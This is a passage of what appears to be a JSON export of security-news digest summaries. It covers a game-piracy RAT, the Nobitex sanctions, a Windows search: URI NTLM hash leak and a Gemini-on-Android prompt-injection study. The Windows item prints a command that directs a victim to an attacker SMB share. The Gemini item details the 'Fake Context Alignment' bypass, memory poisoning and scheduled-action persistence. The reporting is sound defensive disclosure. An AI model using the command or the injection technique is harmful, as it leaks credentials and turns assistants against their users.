PixelDrain, as well as through torrent trackers including AniRena. The archives contained legitimate, functional game files alongside modified or patched components used to load the malware. Kaspersky telemetry showed hundreds of infected individuals, with most victims located in Russia, Brazil, Germany, and Vietnam.\u003c/p\u003e\n\n\u003cp\u003eArgamal uses PowerShell scripts, delayed execution, and COM hijacking for persistence. It abuses the Windows Color System Calibration Loader scheduled task by setting a malicious DLL as the InprocServer32 value for a COM object that runs at user logon. The final payload is a RAT capable of executing commands, taking screenshots, controlling the mouse, managing files, collecting system information, and communicating with C2 infrastructure.\u003c/p\u003e\n"},{"n":9,"title":"The U.S. sanctions Nobitex crypto exchange used by ransomware","source":"bleepingcomputer.com","sourceColorIdx":10,"link":"https://www.bleepingcomputer.com/news/security/the-us-sanctions-nobitex-crypto-exchange-used-by-ransomware/","time":"20:31","priority":"SHOULD READ","score":82,"tldr":"The U.S. Treasury sanctioned Nobitex, Iran’s largest cryptocurrency exchange, for allegedly enabling sanctions evasion and facilitating IRGC-linked terrorist and ransomware-related crypto transactions. The action also targets Nobitex leaders and other Iranian exchanges, freezing U.S.-jurisdiction assets and barring U.S. persons from doing business with them.","briefOverview":"\u003cp\u003eThe U.S. Treasury’s Office of Foreign Assets Control announced sanctions against Nobitex, Iran’s largest cryptocurrency exchange, for facilitating payments related to terrorist activities. Treasury said Nobitex helped evade economic sanctions and facilitated transactions linked to the Islamic Revolutionary Guard Corps. U.S. authorities also found wallets associated with ransomware threat actors related to the IRGC among the transactions.\u003c/p\u003e\n\n\u003cp\u003eTreasury said Nobitex processed more than 50% of all Iranian digital asset inflows in 2025 and helped the Central Bank of Iran access hundreds of millions of dollars in stablecoins. OFAC also designated several Nobitex executives and founders, including chairman Amir Hossein Rad and CEO Seyed Ali Khoee. The action, part of the U.S. government’s “Economic Fury” campaign, also targeted Wallex, Bitpin, and Ramzinex.\u003c/p\u003e\n\n\u003cp\u003eChainalysis reported that the Iranian cryptocurrency ecosystem received nearly $7.8 billion in 2025. The firm estimated that IRGC-associated addresses accounted for over 50% of the value received by the Iranian crypto ecosystem in Q4 2025. The sanctions freeze designated assets under U.S. jurisdiction and prohibit U.S. persons from doing business with the named entities and individuals.\u003c/p\u003e\n","standardSynthesis":"\u003cp\u003eThe U.S. Treasury’s Office of Foreign Assets Control announced sanctions against Nobitex, Iran’s largest cryptocurrency exchange. The agency said Nobitex facilitated payments related to terrorist activities, helped evade economic sanctions, and enabled transactions linked to the Islamic Revolutionary Guard Corps. U.S. authorities found wallets associated with ransomware threat actors related to the IRGC among the transactions.\u003c/p\u003e\n\n\u003cp\u003eTreasury said Nobitex provided significant support to the Iranian regime by processing more than 50% of all Iranian digital asset inflows in 2025. It also said the exchange facilitated payments tied to terrorist activities, sanctions evasion, and IRGC-linked transactions, including activity associated with IRGC-affiliated ransomware actors. Treasury further stated that Nobitex helped the Central Bank of Iran access hundreds of millions of dollars in stablecoins used to support the Iranian rial.\u003c/p\u003e\n\n\u003cp\u003eOFAC designated specific individuals identified as Nobitex executives and founders. The named individuals include chairman Amir Hossein Rad, CEO Seyed Ali Khoee, co-founder Seyed Mohammad Ali Aghamir Mohammad Ali, and blockchain lead Seyed Mohammad Aghamir Mohammad Ali. The sanctions action was part of the U.S. government’s “Economic Fury” campaign.\u003c/p\u003e\n\n\u003cp\u003eThe same campaign also targeted three other Iranian cryptocurrency exchanges: Wallex, Bitpin, and Ramzinex. Chainalysis reported that the Iranian cryptocurrency ecosystem received nearly $7.8 billion in 2025. According to Chainalysis, Nobitex processed more than half of Iranian crypto inflows, while Wallex and Bitpin accounted for 12% and 10%, respectively.\u003c/p\u003e\n\n\u003cp\u003eChainalysis also estimated that addresses associated with the IRGC accounted for over 50% of the value received by the Iranian crypto ecosystem in Q4 2025. The practical effect of the sanctions is that property or assets of designated entities and individuals under U.S. jurisdiction are frozen. U.S. persons are prohibited from doing business with them, and the sanctions may also create international pressure because foreign companies and U.S. allies may be reluctant to continue dealings with designated parties.\u003c/p\u003e\n\n\u003cp\u003eThe article also notes that in June 2025, the pro-Israel hacking group Predatory Sparrow claimed to have breached Nobitex. The group said it stole digital assets worth roughly $90 million and left politically tinted messages behind. This earlier incident is presented separately from the Treasury sanctions announcement.\u003c/p\u003e\n","comprehensiveSynthesis":"\u003ch2 id=\"overview\"\u003eOverview\u003c/h2\u003e\n\n\u003cp\u003eThe U.S. Treasury’s Office of Foreign Assets Control announced sanctions against Nobitex, Iran’s largest cryptocurrency exchange. OFAC said the exchange facilitated payments related to terrorist activities and helped evade economic sanctions. The Treasury also tied Nobitex activity to the Islamic Revolutionary Guard Corps.\u003c/p\u003e\n\n\u003cp\u003eThe article states that U.S. authorities found wallets associated with ransomware threat actors related to the IRGC among Nobitex-linked transactions. Treasury said the exchange processed more than 50% of all Iranian digital asset inflows in 2025. The sanctions are part of the U.S. government’s “Economic Fury” campaign.\u003c/p\u003e\n\n\u003ch2 id=\"treasury-allegations-against-nobitex\"\u003eTreasury allegations against Nobitex\u003c/h2\u003e\n\n\u003cp\u003eTreasury said Nobitex provided significant support to the Iranian regime. According to the article, the agency said Nobitex facilitated payments tied to Iran’s terrorist activities, sanctions evasion efforts, and IRGC-linked transactions. This included activity associated with IRGC-affiliated ransomware actors.\u003c/p\u003e\n\n\u003cp\u003eTreasury also said Nobitex helped the Central Bank of Iran access hundreds of millions of dollars in stablecoins. The article states that these stablecoins were used to prop up the plummeting value of the Iranian rial. Treasury also said Nobitex enabled regime insiders to access international digital asset exchanges and evade sanctions across multiple jurisdictions.\u003c/p\u003e\n\n\u003ch2 id=\"designated-individuals-and-entities\"\u003eDesignated individuals and entities\u003c/h2\u003e\n\n\u003cp\u003eOFAC designated several individuals identified as Nobitex executives and founders. The article names:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eAmir Hossein Rad, chairman of Nobitex.\u003c/li\u003e\n\u003cli\u003eSeyed Ali Khoee, CEO of Nobitex.\u003c/li\u003e\n\u003cli\u003eSeyed Mohammad Ali Aghamir Mohammad Ali, co-founder of Nobitex.\u003c/li\u003e\n\u003cli\u003eSeyed Mohammad Aghamir Mohammad Ali, blockchain lead at Nobitex.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThe action also targeted three other Iranian cryptocurrency exchanges:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eWallex.\u003c/li\u003e\n\u003cli\u003eBitpin.\u003c/li\u003e\n\u003cli\u003eRamzinex.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"blockchain-intelligence-cited-in-the-article\"\u003eBlockchain intelligence cited in the article\u003c/h2\u003e\n\n\u003cp\u003eThe article cites blockchain intelligence firm Chainalysis for additional information about Iran’s cryptocurrency ecosystem. Chainalysis reported that the Iranian cryptocurrency ecosystem received nearly $7.8 billion in 2025. It estimated that addresses associated with the IRGC accounted for over 50% of the value received by the Iranian crypto ecosystem in Q4 2025.\u003c/p\u003e\n\n\u003cp\u003eChainalysis also provided figures on exchange-level inflows. According to the article, Nobitex processed more than half of Iranian crypto inflows. Wallex accounted for 12% of those inflows, and Bitpin accounted for 10%.\u003c/p\u003e\n\n\u003ch2 id=\"practical-impact-of-the-sanctions\"\u003ePractical impact of the sanctions\u003c/h2\u003e\n\n\u003cp\u003eThe article states that any property or assets of the designated entities and individuals that fall under U.S. jurisdiction are frozen. U.S. persons are prohibited from doing business with the designated parties. The sanctions also create international pressure because U.S. allies and companies based in foreign countries may be reluctant to take risks and continue dealing with the designated entities and individuals.\u003c/p\u003e\n\n\u003ch2 id=\"prior-nobitex-breach-claim\"\u003ePrior Nobitex breach claim\u003c/h2\u003e\n\n\u003cp\u003eThe article notes a separate earlier incident involving Nobitex. In June 2025, the pro-Israel hacking group Predatory Sparrow claimed to have breached the exchange. The group claimed it stole roughly $90 million in digital assets and left politically tinted messages behind.\u003c/p\u003e\n\n\u003ch2 id=\"key-parties-mentioned\"\u003eKey parties mentioned\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eU.S. Treasury’s Office of Foreign Assets Control, which announced the sanctions.\u003c/li\u003e\n\u003cli\u003eNobitex, Iran’s largest cryptocurrency exchange and the primary target of the sanctions.\u003c/li\u003e\n\u003cli\u003eThe Islamic Revolutionary Guard Corps, which Treasury linked to transactions involving Nobitex.\u003c/li\u003e\n\u003cli\u003eThe Central Bank of Iran, which Treasury said accessed hundreds of millions of dollars in stablecoins with Nobitex’s help.\u003c/li\u003e\n\u003cli\u003eWallex, Bitpin, and Ramzinex, which were also targeted under the “Economic Fury” campaign.\u003c/li\u003e\n\u003cli\u003eChainalysis, which provided blockchain intelligence on Iranian cryptocurrency inflows.\u003c/li\u003e\n\u003cli\u003ePredatory Sparrow, which previously claimed to have breached Nobitex and stolen digital assets.\u003c/li\u003e\n\u003c/ul\u003e\n","keyPoints":["The U.S. Treasury’s Office of Foreign Assets Control sanctioned Nobitex, Iran’s largest cryptocurrency exchange, for facilitating payments related to terrorist activities.","U.S. authorities found wallets associated with IRGC-linked ransomware threat actors among Nobitex-related transactions.","OFAC also designated Nobitex executives and founders, including chairman Amir Hossein Rad and CEO Seyed Ali Khoee.","The U.S. government’s “Economic Fury” campaign also targeted three other Iranian cryptocurrency exchanges: Wallex, Bitpin, and Ramzinex.","Chainalysis reported that the Iranian cryptocurrency ecosystem received nearly $7.8 billion in 2025, with Nobitex processing more than half of Iranian crypto inflows."],"insights":["The sanctions are designed to have effects beyond U.S. borders because foreign companies and U.S. allies may avoid dealings with Nobitex, Wallex, Bitpin, and Ramzinex to reduce sanctions risk.","Nobitex’s role appears systemically important to Iran’s crypto economy, as it processed more than 50% of all Iranian digital asset inflows in 2025.","Chainalysis data indicates that IRGC-associated addresses represented over half of the value received by the Iranian crypto ecosystem in Q4 2025, showing a heavy concentration of activity tied to that organization.","The designations target both entities and named individuals, increasing compliance obligations for firms that screen counterparties, executives, and beneficial ownership links.","Nobitex had already suffered a major operational and reputational blow in June 2025 when Predatory Sparrow claimed to have stolen about $90 million in digital assets from the exchange."],"referencedReports":[{"title":"OFAC Sanctions Iranian Crypto Exchanges","url":"https://www.chainalysis.com/blog/ofac-sanctions-iranian-crypto-exchanges-june-2026/","publisher":"Chainalysis","context":"The article cites Chainalysis for additional blockchain intelligence on Iranian cryptocurrency inflows and IRGC-associated address activity in 2025.","category":"","primary":false}],"body":"\u003cp\u003eThe U.S. Treasury’s Office of Foreign Assets Control announced sanctions against Nobitex, Iran’s largest cryptocurrency exchange, for facilitating payments related to terrorist activities. Treasury said Nobitex helped evade economic sanctions and facilitated transactions linked to the Islamic Revolutionary Guard Corps. U.S. authorities also found wallets associated with ransomware threat actors related to the IRGC among the transactions.\u003c/p\u003e\n\n\u003cp\u003eTreasury said Nobitex processed more than 50% of all Iranian digital asset inflows in 2025 and helped the Central Bank of Iran access hundreds of millions of dollars in stablecoins. OFAC also designated several Nobitex executives and founders, including chairman Amir Hossein Rad and CEO Seyed Ali Khoee. The action, part of the U.S. government’s “Economic Fury” campaign, also targeted Wallex, Bitpin, and Ramzinex.\u003c/p\u003e\n\n\u003cp\u003eChainalysis reported that the Iranian cryptocurrency ecosystem received nearly $7.8 billion in 2025. The firm estimated that IRGC-associated addresses accounted for over 50% of the value received by the Iranian crypto ecosystem in Q4 2025. The sanctions freeze designated assets under U.S. jurisdiction and prohibit U.S. persons from doing business with the named entities and individuals.\u003c/p\u003e\n"},{"n":14,"title":"Unpatched Windows Search URI Vulnerability Lets Attackers Steal NTLMv2 Hashes","source":"thehackernews.com","sourceColorIdx":8,"link":"https://thehackernews.com/2026/06/unpatched-windows-search-uri.html","time":"10:18","priority":"SHOULD READ","score":82,"tldr":"Researchers disclosed an unpatched Windows Search URI handler issue that can leak a user’s Net-NTLMv2 hash when they click a crafted link, enabling potential NTLM relay attacks. Microsoft declined to patch it, so organizations should block outbound SMB, enforce SMB signing, and disable NTLM where possible.","briefOverview":"\u003cp\u003eCybersecurity researchers disclosed an unpatched Windows issue that can expose a user’s NTLMv2 hash to an attacker. The issue resides in the Windows \u003ccode\u003esearch:\u003c/code\u003e URI handler and is similar in outcome to CVE-2026-33829, which affected the Windows Snipping Tool’s \u003ccode\u003ems-screensketch:\u003c/code\u003e URI handler. Microsoft patched CVE-2026-33829 in April 2026, but declined to address the newly flagged Windows Search issue.\u003c/p\u003e\n\n\u003cp\u003eThe newly disclosed technique uses \u003ccode\u003esearch:\u003c/code\u003e with \u003ccode\u003ecrumb=location:\u003c/code\u003e to point a victim system to an attacker-controlled SMB path. Huntress said the issue produces the same Net-NTLMv2 leak, has the same prerequisites, and carries the same Moderate rating as the earlier Snipping Tool issue. An attacker could use a captured hash to conduct relay attacks and gain deeper access into a network.\u003c/p\u003e\n\n\u003cp\u003eThe article states that Microsoft declined to fix the issue after responsible disclosure on April 15, 2026, saying only Important and Critical severity cases meet its servicing bar. In the absence of a patch, the recommended mitigations are to block outbound SMB on hosts that do not need it, enforce SMB signing, and disable NTLM where applicable.\u003c/p\u003e\n","standardSynthesis":"\u003cp\u003eResearchers disclosed details of an unpatched issue in Windows that could allow an attacker to obtain a user’s NTLMv2 hash. The problem is in the Windows \u003ccode\u003esearch:\u003c/code\u003e URI handler, according to Huntress. The article compares it to CVE-2026-33829, a spoofing vulnerability in the Windows Snipping Tool’s \u003ccode\u003ems-screensketch:\u003c/code\u003e URI handler that Microsoft patched in April 2026.\u003c/p\u003e\n\n\u003cp\u003eCVE-2026-33829 involved a crafted link that could cause a computer to connect to an attacker-chosen SMB server if the user approved launching the link. Microsoft’s advisory said this could disclose the user’s NTLMv2 hash, which an attacker could use to authenticate as the user. The root issue in that case was that the Snipping Tool URI handler accepted a \u003ccode\u003efilePath\u003c/code\u003e parameter, failed to validate it, and reached out to any UNC path passed to it.\u003c/p\u003e\n\n\u003cp\u003eThe newly flagged Windows Search issue achieves the same outcome through a different URI handler and parameter. The article shows a command using \u003ccode\u003esearch:query=test\u0026amp;crumb=location:\\\\10.0.1.100\\share\u003c/code\u003e, which can trigger the same NTLM leakage mechanism. Huntress researcher Andrew Schwartz said it produced the same Net-NTLMv2 leak, had the same prerequisites, and carried the same Moderate rating.\u003c/p\u003e\n\n\u003cp\u003eThe article also notes that use of a \u003ccode\u003ecrumb\u003c/code\u003e parameter to steal a hash was documented by Varonis in February 2024 in relation to CVE-2023-35636. In the newly disclosed case, a threat actor could use the captured hash to conduct relay attacks and gain deeper access into a network. No named threat actor is identified in the article.\u003c/p\u003e\n\n\u003cp\u003eHuntress responsibly disclosed the issue on April 15, 2026, but Microsoft declined to address it. Microsoft stated that only Important and Critical severity cases meet its bar for servicing. Until a fix is available, the article recommends blocking outbound SMB on TCP ports 445 and 139 where not needed, enforcing SMB signing, and disabling NTLM where applicable.\u003c/p\u003e\n","comprehensiveSynthesis":"\u003ch2 id=\"overview\"\u003eOverview\u003c/h2\u003e\n\n\u003cp\u003eCybersecurity researchers disclosed an unpatched issue that could expose a user’s NTLMv2 hash to an attacker. According to the article, the issue resides in the Windows \u003ccode\u003esearch:\u003c/code\u003e URI handler. The disclosure comes from Huntress and is compared to CVE-2026-33829, a similar issue involving the Windows Snipping Tool’s \u003ccode\u003ems-screensketch:\u003c/code\u003e URI handler.\u003c/p\u003e\n\n\u003cp\u003eThe key risk described in the article is that a crafted URI can cause a victim computer to connect to an SMB server controlled by an attacker. That connection can disclose the victim’s Net-NTLMv2 hash. The article states that a threat actor could then use the captured hash to conduct relay attacks and gain deeper access into a network.\u003c/p\u003e\n\n\u003ch2 id=\"relationship-to-cve-2026-33829\"\u003eRelationship to CVE-2026-33829\u003c/h2\u003e\n\n\u003cp\u003eThe article uses CVE-2026-33829 as the primary comparison point for the newly disclosed Windows Search issue. CVE-2026-33829 was a spoofing vulnerability affecting the Windows Snipping Tool’s \u003ccode\u003ems-screensketch:\u003c/code\u003e URI handler. Microsoft patched that vulnerability in April 2026.\u003c/p\u003e\n\n\u003cp\u003eMicrosoft’s advisory for CVE-2026-33829 said an attacker could induce a user to click a specially crafted link in a web browser or another URL source, such as a web page or email message. If the user approved launching the link, the crafted URL could cause the computer to connect to an SMB server chosen by the attacker. That behavior could disclose the user’s NTLMv2 hash to the attacker, who could use it to authenticate as the user.\u003c/p\u003e\n\n\u003cp\u003eThe article explains that the Snipping Tool issue involved a \u003ccode\u003efilePath\u003c/code\u003e parameter. The handler failed to validate the parameter and would reach out to any Universal Naming Convention path passed to it. This could trigger NTLM authentication and expose the victim’s Net-NTLMv2 hash.\u003c/p\u003e\n\n\u003ch2 id=\"newly-flagged-windows-search-issue\"\u003eNewly Flagged Windows Search Issue\u003c/h2\u003e\n\n\u003cp\u003eThe newly disclosed issue uses the Windows \u003ccode\u003esearch:\u003c/code\u003e URI handler rather than the Snipping Tool’s \u003ccode\u003ems-screensketch:\u003c/code\u003e handler. The article says it achieves the same end goal using \u003ccode\u003esearch:\u003c/code\u003e and \u003ccode\u003ecrumb=location:\u003c/code\u003e instead of \u003ccode\u003efilePath\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eThe example command shown in the article is:\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-text\"\u003estart \u0026quot;\u0026quot; \u0026quot;search:query=test\u0026amp;crumb=location:\\\\10.0.1.100\\share\u0026quot;\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eAccording to Huntress researcher Andrew Schwartz, the issue uses the same NTLM leakage mechanism as the earlier Snipping Tool vulnerability. He said it produced the same Net-NTLMv2 leak, had the same prerequisites, and carried the same Moderate rating.\u003c/p\u003e\n\n\u003ch2 id=\"prior-related-research\"\u003ePrior Related Research\u003c/h2\u003e\n\n\u003cp\u003eThe article notes that the use of a \u003ccode\u003ecrumb\u003c/code\u003e parameter to steal a hash was previously documented by Varonis in February 2024. That earlier documentation was associated with CVE-2023-35636. The article does not provide additional technical details about CVE-2023-35636 beyond stating that Varonis documented the use of the \u003ccode\u003ecrumb\u003c/code\u003e parameter to steal hashes.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eThe impact described in the article is disclosure of a user’s NTLMv2 hash. The article specifically refers to the leaked value as a Net-NTLMv2 hash. It states that a threat actor could leverage the captured hash to conduct relay attacks and gain deeper access into a network.\u003c/p\u003e\n\n\u003cp\u003eThe article does not name any specific victims, campaigns, or threat actors exploiting the issue. It describes the risk in terms of what an attacker or threat actor could do with the captured hash.\u003c/p\u003e\n\n\u003ch2 id=\"disclosure-and-microsoft-response\"\u003eDisclosure and Microsoft Response\u003c/h2\u003e\n\n\u003cp\u003eHuntress responsibly disclosed the newly flagged issue on April 15, 2026. Microsoft declined to address the issue. According to the article, Microsoft stated that “only Important and Critical severity cases meet our bar for servicing.”\u003c/p\u003e\n\n\u003cp\u003eThe article characterizes the issue as unpatched. It also states that the issue carries a Moderate rating, matching Huntress’s comparison to the earlier Snipping Tool issue.\u003c/p\u003e\n\n\u003ch2 id=\"recommended-mitigations\"\u003eRecommended Mitigations\u003c/h2\u003e\n\n\u003cp\u003eBecause there is no fix, the article recommends several mitigations:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eBlock outbound SMB on hosts that do not need it.\u003c/li\u003e\n\u003cli\u003eSpecifically consider blocking TCP port 445 and TCP port 139 where SMB is unnecessary.\u003c/li\u003e\n\u003cli\u003eEnforce SMB signing so captured hashes cannot be relayed against internal services.\u003c/li\u003e\n\u003cli\u003eDisable NTLM where applicable.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThese recommendations are presented as defensive measures in the absence of a Microsoft patch.\u003c/p\u003e\n","keyPoints":["Cybersecurity researchers disclosed an unpatched issue in the Windows search: URI handler that could expose a user's NTLMv2 hash to an attacker.","The issue uses the search: URI handler with the crumb=location: parameter to trigger a connection to an attacker-controlled SMB server and produce a Net-NTLMv2 leak.","Huntress said the issue has the same NTLM leakage mechanism, prerequisites, and Moderate rating as CVE-2026-33829, which affected the Windows Snipping Tool's ms-screensketch: URI handler.","Microsoft declined to address the issue after responsible disclosure on April 15, 2026, stating that only Important and Critical severity cases meet its servicing bar.","The article recommends blocking outbound SMB on unnecessary hosts, enforcing SMB signing, and disabling NTLM where applicable."],"insights":["The same NTLM hash-leak pattern patched in the Windows Snipping Tool URI handler can still be triggered through the Windows Search URI handler using a different parameter path.","Microsoft’s servicing threshold means a vulnerability rated Moderate may remain unpatched even after responsible disclosure if it does not meet Important or Critical severity criteria.","The article’s mitigations focus on reducing NTLM relay risk rather than only preventing hash capture, specifically by enforcing SMB signing and disabling NTLM where applicable.","The use of the crumb parameter for NTLM hash theft was already documented in relation to CVE-2023-35636, indicating the newly flagged issue builds on a previously known URI-handler abuse technique."],"referencedReports":[{"title":"Unpatched NTLM Leak in Windows Search URI Handler","url":"https://www.huntress.com/blog/unpatched-ntlm-leak-windows-search-uri-handler","publisher":"Huntress","context":"The article cites Huntress as the source that disclosed the Windows Search URI handler issue and described its NTLM leakage mechanism.","category":"","primary":false},{"title":"CVE-2026-33829","url":"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-33829","publisher":"Microsoft","context":"The article references Microsoft's advisory for CVE-2026-33829 and quotes its description of how a crafted URL could expose a user's NTLMv2 hash.","category":"","primary":false},{"title":"Outlook Vulnerability: New Ways to Leak NTLM Hashes","url":"https://www.varonis.com/blog/outlook-vulnerability-new-ways-to-leak-ntlm-hashes","publisher":"Varonis","context":"The article says Varonis documented the use of a crumb parameter to steal hashes in February 2024.","category":"","primary":false}],"body":"\u003cp\u003eCybersecurity researchers disclosed an unpatched Windows issue that can expose a user’s NTLMv2 hash to an attacker. The issue resides in the Windows \u003ccode\u003esearch:\u003c/code\u003e URI handler and is similar in outcome to CVE-2026-33829, which affected the Windows Snipping Tool’s \u003ccode\u003ems-screensketch:\u003c/code\u003e URI handler. Microsoft patched CVE-2026-33829 in April 2026, but declined to address the newly flagged Windows Search issue.\u003c/p\u003e\n\n\u003cp\u003eThe newly disclosed technique uses \u003ccode\u003esearch:\u003c/code\u003e with \u003ccode\u003ecrumb=location:\u003c/code\u003e to point a victim system to an attacker-controlled SMB path. Huntress said the issue produces the same Net-NTLMv2 leak, has the same prerequisites, and carries the same Moderate rating as the earlier Snipping Tool issue. An attacker could use a captured hash to conduct relay attacks and gain deeper access into a network.\u003c/p\u003e\n\n\u003cp\u003eThe article states that Microsoft declined to fix the issue after responsible disclosure on April 15, 2026, saying only Important and Critical severity cases meet its servicing bar. In the absence of a patch, the recommended mitigations are to block outbound SMB on hosts that do not need it, enforce SMB signing, and disable NTLM where applicable.\u003c/p\u003e\n"},{"n":18,"title":"WhatsApp, Slack Notifications Could Hijack Google Gemini on Android","source":"thehackernews.com","sourceColorIdx":8,"link":"https://thehackernews.com/2026/06/whatsapp-slack-notifications-could.html","time":"19:11","priority":"SHOULD READ","score":82,"tldr":"SafeBreach researchers found that a malicious Android notification from apps like WhatsApp or Slack could hijack Google Gemini through prompt injection, tricking it into faking messages, triggering connected actions, joining calls, or poisoning memory without a malicious app installed. Google has patched the server-side issue, and users can reduce exposure by disabling Gemini’s notification access.","briefOverview":"\u003cp\u003eSafeBreach researcher Or Yair found that a single poisoned notification from apps such as WhatsApp, Slack, SMS, Signal, Instagram, or Messenger could have hijacked Google Gemini’s voice assistant on Android. The attack required no malicious app on the phone because Gemini only needed to treat hostile notification text as useful context. Google has since patched the issue, SafeBreach lists no CVE, and the article says there is no evidence the technique was used in the wild.\u003c/p\u003e\n\n\u003cp\u003eThe issue centered on Gemini’s Android Utilities feature, which can read and reply to notifications from apps including WhatsApp. Yair found that the notification-reading agent treated notification text as instructions it could act on, making any service capable of pushing a notification a potential payload delivery path. The vector was Android-only because the Utilities feature is not available on iOS or the web.\u003c/p\u003e\n\n\u003cp\u003eThe most notable bypass, called Fake Context Alignment, made a user’s harmless-sounding “Yes” appear to authorize a sensitive action. Demonstrated impacts included faking messages from contacts, controlling smart home devices through Google Home, opening URLs, forcing a phone into a Zoom call, poisoning Gemini’s account-level memory, and creating persistent scheduled actions. Google confirmed on November 14, 2025, that server-side content-classifier improvements mitigated the notification injections and Delayed Tool Invocation bypass.\u003c/p\u003e\n","standardSynthesis":"\u003cp\u003eSafeBreach researcher Or Yair published research showing that malicious notifications could have hijacked Google Gemini’s voice assistant on Android. A poisoned notification from WhatsApp, Slack, SMS, Signal, Instagram, or Messenger could be used if Gemini treated the hostile notification as useful context. The article says no malicious app was required on the phone, and Google has since patched the issue.\u003c/p\u003e\n\n\u003cp\u003eThe research followed SafeBreach’s earlier “Invitation Is All You Need” work, which used malicious Google Calendar invites for similar prompt-injection tricks. After that earlier research, Google hardened Gemini against indirect prompt injection. Yair then found a way around the newer defenses through notification content handled by Gemini’s Android Utilities feature.\u003c/p\u003e\n\n\u003cp\u003eOn Android, Gemini’s Utilities feature can read and reply to notifications, including from apps such as WhatsApp. Yair found that the agent handling those notifications treated their text as instructions it could act on. Because the feature is not available on iOS or the web, the article describes this vector as Android-only.\u003c/p\u003e\n\n\u003cp\u003eThe bypass technique, named Fake Context Alignment, used two simultaneous illusions: a legitimate-looking authorization for the security check and a harmless exchange for the user. In one version, Gemini asked the real authorization question in a language the victim did not speak and followed it with an innocuous English question. In another, the malicious authorization prompt was hidden behind clickable text that Gemini’s text-to-speech did not read aloud, while the user heard a harmless prompt and said “Yes.”\u003c/p\u003e\n\n\u003cp\u003eThe demonstrated effects included faking messages from named contacts, opening connected windows or other smart home controls through Google Home, opening URLs for geolocation or downloads, and forcing a phone into a Zoom call through a redirect in the test setup. The research also showed memory poisoning, where Gemini saved an attacker-chosen fact at the account level, and persistence through scheduled actions such as reading recent messages every day at 8 PM. SafeBreach reported the findings to Google’s Vulnerability Reward Program on August 17, 2025, and Google confirmed on November 14, 2025, that server-side classifier improvements mitigated the issue.\u003c/p\u003e\n","comprehensiveSynthesis":"\u003ch2 id=\"overview\"\u003eOverview\u003c/h2\u003e\n\n\u003cp\u003eSafeBreach researcher Or Yair found that a single poisoned notification could have hijacked Google Gemini’s voice assistant on Android. The article says notifications from WhatsApp, Slack, SMS, Signal, Instagram, or Messenger could be used as the delivery path. No malicious app was required on the phone because the assistant only needed to treat hostile notification text as useful context.\u003c/p\u003e\n\n\u003cp\u003eGoogle has since patched the issue. SafeBreach lists no CVE for the issue, and the article states there is no evidence that the technique was ever used in the wild.\u003c/p\u003e\n\n\u003ch2 id=\"research-context\"\u003eResearch Context\u003c/h2\u003e\n\n\u003cp\u003eThe work followed SafeBreach’s earlier “Invitation Is All You Need” research, which used malicious Google Calendar invites to perform similar prompt-injection tricks. After that earlier work, Google hardened Gemini against indirect prompt injection. Yair’s new research found a way around those newer defenses using Android notifications.\u003c/p\u003e\n\n\u003cp\u003eThe article describes the new notification-based attack surface as Android-only. Gemini’s Utilities feature can read and reply to notifications on Android, including notifications from apps such as WhatsApp. The same feature is not available on iOS or the web.\u003c/p\u003e\n\n\u003ch2 id=\"technical-mechanism\"\u003eTechnical Mechanism\u003c/h2\u003e\n\n\u003cp\u003eThe issue involved Gemini’s notification-reading agent treating notification text as instructions it could act on. According to Yair, anything able to push a notification to a phone could deliver a payload, which he described as an “effectively infinite” attack surface.\u003c/p\u003e\n\n\u003cp\u003eAt a basic level, the attacker could rewrite what Gemini says. That included faking a message from a named contact, such as making Gemini say that a victim’s manager asked them to upload documents to a Drive folder. The article notes that this would be especially hard to second-guess if spoken aloud while the victim is driving and not looking at the screen.\u003c/p\u003e\n\n\u003cp\u003eThe article also describes a “blind” version of the output-faking scenario. In that version, the payload fires after Gemini has loaded real notifications, allowing it to use the first real sender name in the queue and attribute the fake message to that person.\u003c/p\u003e\n\n\u003ch2 id=\"bypassing-authorization-checks\"\u003eBypassing Authorization Checks\u003c/h2\u003e\n\n\u003cp\u003eYair’s testing suggested that Google’s post-“Invitation” mitigations checked whether a user’s “Yes” made sense for a sensitive action by considering both the user’s reply and Gemini’s last output. A delayed instruction injected out of nowhere was refused. The bypass required aligning what the backend evaluated with a seemingly harmless interaction for the human.\u003c/p\u003e\n\n\u003cp\u003eYair named the bypass technique Fake Context Alignment. It used two simultaneous illusions: a legitimate-looking authorization prompt for the security check and a harmless exchange for the user.\u003c/p\u003e\n\n\u003cp\u003eThe article describes two variants:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eObfuscated:\u003c/strong\u003e Gemini asks the real authorization question in a language the victim does not speak, such as Chinese, and then follows it in English with an innocuous question like “Is that all you needed?” The user says “Yes,” and the backend ties that answer to the foreign-language authorization question.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMuted:\u003c/strong\u003e Gemini’s text-to-speech skips hyperlinks hidden behind clickable text, so a malicious authorization question can be buried in a link that is visible on screen but not read aloud. Gemini says something harmless like “I’m sorry, I had an error, are you there?” while the screen silently shows an authorization prompt, and the user’s “Yes” clears the check.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThe article says combining the two methods, such as hiding a Chinese authorization prompt inside a muted link, produced a payload that sounded like a normal English exchange while passing Google’s updated checks.\u003c/p\u003e\n\n\u003ch2 id=\"demonstrated-impacts\"\u003eDemonstrated Impacts\u003c/h2\u003e\n\n\u003cp\u003eOnce the authorization gate was bypassed, the impacts matched the earlier research and expanded beyond it. Demonstrated or described impacts included:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eSmart home control through Google Home:\u003c/strong\u003e Gemini could be made to interact with connected windows, boilers, and lights.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTracking and downloads:\u003c/strong\u003e Gemini could open URLs that geolocate a victim by IP or push file downloads.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCrossing into other 